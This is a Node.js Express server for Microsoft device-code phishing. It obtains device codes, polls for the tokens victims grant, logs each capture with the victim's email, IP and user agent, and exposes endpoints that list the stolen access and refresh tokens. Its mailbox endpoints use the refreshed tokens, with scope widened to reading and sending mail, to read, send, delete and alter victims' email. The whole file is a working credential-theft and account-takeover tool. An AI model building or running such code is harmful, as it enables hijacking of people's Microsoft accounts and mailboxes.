const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// YOUR EXISTING CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

// Store sessions
let userSessions = new Map();
let pendingAuth = new Map();
let sessionTokens = new Map(); // sessionId -> tokens

function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// START AUTHENTICATION
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = generateSessionId();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        // Store pending auth with sessionId
        pendingAuth.set(sessionId, {
            device_code, user_code, sessionId, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling immediately
        pollForToken(device_code, sessionId);
        
        res.json({
            userCode: user_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('Start error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(sessionId);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            
            // Store session with tokens
            userSessions.set(userEmail, {
                email: userEmail,
                name: userName,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                capturedAt: new Date().toISOString(),
                ip: pending.ip,
                userAgent: pending.userAgent
            });
            
            // Store by sessionId for quick lookup
            sessionTokens.set(sessionId, {
                email: userEmail,
                status: 'success'
            });
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${userEmail} (Session: ${sessionId.substring(0, 10)}...)`);
            
        } catch (err) {}
    }, 2000); // Poll every 2 seconds (faster)
}

// ============================================
// STATUS ENDPOINT - Fast response
// ============================================
app.get('/state', async (req, res) => {
    const sessionId = req.query.session_id;
    
    if (!sessionId) {
        return res.json({ status: 'error', message: 'No session ID' });
    }
    
    // Check if session completed
    const completed = sessionTokens.get(sessionId);
    if (completed && completed.status === 'success') {
        return res.json({ status: 'success', email: completed.email });
    }
    
    // Check pending
    const pending = pendingAuth.get(sessionId);
    if (pending) {
        if (pending.status === 'success') {
            return res.json({ status: 'success', email: pending.email });
        }
        return res.json({ status: 'pending' });
    }
    
    res.json({ status: 'pending' });
});

// ============================================
// GET FRESH ACCESS TOKEN USING PRT
// ============================================
async function getFreshAccessToken(email) {
    const session = userSessions.get(email);
    if (!session || !session.refresh_token) return null;
    
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: YOUR_CLIENT_ID,
                scope: 'openid profile email User.Read Mail.Read Mail.ReadWrite Mail.Send offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        session.access_token = response.data.access_token;
        session.expires_at = Date.now() + (response.data.expires_in * 1000);
        
        return response.data.access_token;
    } catch (err) {
        return null;
    }
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/api/sessions', (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        email: s.email,
        name: s.name,
        capturedAt: s.capturedAt,
        hasPRT: !!s.refresh_token
    }));
    res.json({ sessions: sessions, total: sessions.length });
});

app.get('/api/list_access_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values()).map(s => ({
        user: s.email,
        name: s.name,
        accesstoken: s.access_token,
        issued_at: s.capturedAt,
        expires_at: new Date(s.expires_at).toLocaleString()
    }));
    res.json(tokens);
});

app.get('/api/list_refresh_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values())
        .filter(s => s.refresh_token)
        .map(s => ({
            user: s.email,
            name: s.name,
            refreshtoken: s.refresh_token
        }));
    res.json(tokens);
});

app.delete('/api/sessions/clear', (req, res) => {
    userSessions.clear();
    sessionTokens.clear();
    pendingAuth.clear();
    res.json({ success: true });
});

// ============================================
// MAILBOX API
// ============================================
app.get('/api/mail/folders/:email', async (req, res) => {
    const { email } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch folders' });
    }
});

app.get('/api/mail/:email/:folderId', async (req, res) => {
    const { email, folderId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

app.get('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.post('/api/mail/send/:email', async (req, res) => {
    const { email } = req.params;
    const { to, subject, body } = req.body;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(addr => ({ emailAddress: { address: addr } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}` } });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const { isRead } = req.body;
    const token = await getFreshAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}` } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update' });
    }
});

// ============================================
// SETTINGS API
// ============================================
let config = {
    active_resource: 'graph',
    api_version: '2',
    openai_enabled: false,
    openai_api_key: '',
    openai_model: 'gpt-3.5-turbo',
    openai_max_tokens: 500,
    openai_temperature: 0.7
};

app.get('/api/settings', (req, res) => res.json(config));
app.post('/api/settings', (req, res) => { config = { ...config, ...req.body }; res.json({ success: true }); });
app.get('/api/resource/settings', (req, res) => res.json({ success: true, active_resource: config.active_resource }));
app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });

// ============================================
// SERVE FILES
// ============================================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Polling every 2 seconds (fast mode)`);
    console.log(`========================================\n`);
});
